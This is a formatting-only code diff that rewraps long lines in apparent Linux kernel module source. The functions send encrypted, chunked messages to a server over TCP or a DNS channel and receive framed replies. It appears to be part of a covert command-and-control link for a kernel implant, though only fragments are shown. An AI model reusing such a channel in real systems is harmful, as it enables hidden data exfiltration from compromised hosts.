@@ -26,7 +26,8 @@ static inline bool all_chunks_received(bool *received, size_t count) {
     return true;
 }
 
-// Formats a string with variable arguments and returns a dynamically allocated buffer
+// Formats a string with variable arguments and returns a dynamically allocated
+// buffer
 static char *vformat_string(const char *fmt, va_list ap) {
     va_list args_copy;
     char *formatted;
@@ -88,7 +89,8 @@ int send_to_server(enum Protocol protocol, char *message, ...) {
         return dns_send_data(formatted_message, strlen(formatted_message));
 
     // Send the formatted message through TCP
-    int ret_code = send_to_server_raw(formatted_message, strlen(formatted_message));
+    int ret_code =
+        send_to_server_raw(formatted_message, strlen(formatted_message));
 
     // Free the formatted message buffer
     kfree(formatted_message);
@@ -113,7 +115,9 @@ int send_to_server_raw(const char *data, size_t len) {
 
     // Send each chunk individually
     for (size_t i = 0; i < nb_chunks; ++i) {
-        size_t chunk_len = (i == nb_chunks - 1) ? (encrypted_len - i * max_chunk_body) : max_chunk_body;
+        size_t chunk_len = (i == nb_chunks - 1)
+            ? (encrypted_len - i * max_chunk_body)
+            : max_chunk_body;
 
         char *chunk = kzalloc(STD_BUFFER_SIZE, GFP_KERNEL);
         if (!chunk) {
@@ -195,7 +199,8 @@ int receive_from_server(char *buffer, size_t max_len) {
         // Read exactly the size of header in bytes
         off = 0;
         while (off < HEADER_SIZE) {
-            struct kvec vec = { .iov_base = header_buffer + off, .iov_len = HEADER_SIZE - off };
+            struct kvec vec = { .iov_base = header_buffer + off,
+                                .iov_len = HEADER_SIZE - off };
             struct msghdr msg = { 0 };
             n = kernel_recvmsg(sock, &msg, &vec, 1, vec.iov_len, 0);
             if (n <= 0) {
@@ -218,7 +223,8 @@ int receive_from_server(char *buffer, size_t max_len) {
         // Read payload and the EOT
         off = 0;
         while (off < (int)(data_len + EOT_SIZE)) {
-            struct kvec vec = { .iov_base = payloadbuf + off, .iov_len = (data_len + EOT_SIZE) - off };
+            struct kvec vec = { .iov_base = payloadbuf + off,
+                                .iov_len = (data_len + EOT_SIZE) - off };
             struct msghdr msg = { 0 };
             n = kernel_recvmsg(sock, &msg, &vec, 1, vec.iov_len, 0);
             if (n <= 0) {
